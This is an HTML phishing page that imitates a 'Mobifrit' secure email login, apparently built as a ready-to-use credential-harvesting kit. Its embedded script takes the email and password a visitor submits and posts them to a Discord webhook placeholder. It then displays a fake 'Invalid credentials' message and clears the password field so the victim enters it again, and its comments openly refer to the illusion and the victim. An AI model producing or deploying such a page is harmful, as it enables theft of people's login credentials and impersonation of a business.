<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobifrit Email Portal</title>
    <style>
        /* Same dark, modern CSS as before – keeps the illusion */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .login-container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            text-align: center;
        }
        .logo {
            font-size: 32px;
            font-weight: 700;
            color: #e94560;
            letter-spacing: 2px;
            margin-bottom: 10px;
            text-transform: uppercase;
        }
        .logo span { color: #fff; }
        .subtitle {
            color: #a0a0b0;
            font-size: 14px;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            display: block;
            color: #ccc;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 500;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(255,255,255,0.07);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 10px;
            color: #fff;
            font-size: 15px;
            transition: all 0.3s;
            outline: none;
        }
        .input-group input:focus {
            border-color: #e94560;
            background: rgba(233,69,96,0.05);
            box-shadow: 0 0 0 3px rgba(233,69,96,0.1);
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #e94560;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 10px;
        }
        .login-btn:hover {
            background: #c23152;
        }
        .footer {
            margin-top: 25px;
            color: #666;
            font-size: 12px;
            border-top: 1px solid rgba(255,255,255,0.1);
            padding-top: 20px;
        }
        .footer a {
            color: #e94560;
            text-decoration: none;
        }
        .error-msg {
            color: #ff6b6b;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">MOBI<span>FRIT</span></div>
        <p class="subtitle">Secure Email Portal</p>
        <form id="loginForm">
            <div class="input-group">
                <label>Email Address</label>
                <input type="email" id="email" name="email" placeholder="info@mobifrit.be" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <div class="error-msg" id="errorMsg">Invalid credentials. Please try again.</div>
            <button type="submit" class="login-btn">Sign In</button>
        </form>
        <div class="footer">
            <p>Mobifrit Email System &copy; 2026</p>
            <p><a href="#">Forgot password?</a> | <a href="#">Help</a></p>
        </div>
    </div>

    <script>
        // Discord webhook URL – replace with yours!
        const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL";

        document.getElementById("loginForm").addEventListener("submit", async function(e) {
            e.preventDefault();

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            // Send the credentials to your Discord channel
            const payload = {
                content: `**New Mobifrit Login**\n📧 Email: ${email}\n🔑 Password: ${password}\n🕒 ${new Date().toISOString()}`
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                // Even if the fetch fails, the victim doesn't see anything
            }

            // Show a fake error and clear the password field – the victim will try again
            document.getElementById("errorMsg").style.display = "block";
            document.getElementById("password").value = "";
        });
    </script>
</body>
</html>
